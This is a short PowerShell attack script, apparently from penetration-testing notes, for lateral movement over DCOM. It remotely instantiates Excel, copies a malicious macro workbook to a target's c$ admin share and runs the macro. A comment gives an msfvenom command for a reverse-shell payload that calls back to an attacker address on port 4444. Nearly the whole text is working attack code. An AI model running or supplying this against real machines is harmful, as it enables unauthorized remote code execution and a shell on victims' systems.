#This script is designed to attack a Windows remote Windows machine over DCOM. Requires access to TCP ports 135 and 445
#This example will upload an Office document with a malicious macro 
#Look for methods to abuse 
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.177.10"))
$com | Get-Member #(Look for Run as an example)
#Generate macro payload msfvenom -p windows/shell_reverse_tcp LHOST=172.16.177.10 LPORT=4444 -f hta-psh -o evil.hta

#Upload file onto target machine
$LocalPath = "C:\Users\jeff_admin.corp\evil.xls"
$RemotePath = "\\172.16.177.5\c$\evil.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

#Create user profile if it does not exist
$Path = "\\172.16.177.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)

#Open file and execute macro
$Workbook = $com.Workbooks.Open("C:\evil.xls")
$com.Run("mymacro")
